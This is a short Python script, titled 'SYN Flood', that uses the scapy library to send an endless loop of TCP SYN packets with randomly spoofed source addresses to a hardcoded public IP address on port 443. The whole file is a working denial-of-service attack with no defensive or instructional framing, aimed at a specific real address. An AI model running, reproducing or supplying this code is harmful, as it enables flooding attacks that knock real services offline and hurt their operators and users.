"""
    +++++ SYN Flood +++++

    
"""

from scapy.all import *
import random

#targetIP = input("Enter IP address of target: ");

targetIP = "44.228.239.90";

packetIP = 0;

def create_random_IP():
    a = str(random.randint(0, 255));
    b = str(random.randint(0, 255));
    c = str(random.randint(0, 255));
    d = str(random.randint(0, 255));
    dot = ".";
    return a + dot + b + dot + c + dot + d;

while(True):
    """ Create random soucre IP address """
    sourceIP = create_random_IP();
    """ Send large amount of packets from a source to a target IP address """
    IP_Packet = IP(src = sourceIP, dst = targetIP);
    TCP_Packet = TCP(sport = 443, dport = 443, flags = "S", seq = packetIP);
    packet = IP_Packet / TCP_Packet;
    """ Send packets at layer 3 """
    send(packet);

    packetIP = packetIP + 1;
    print("Packet sent no# ", packetIP, " from source ", sourceIP);
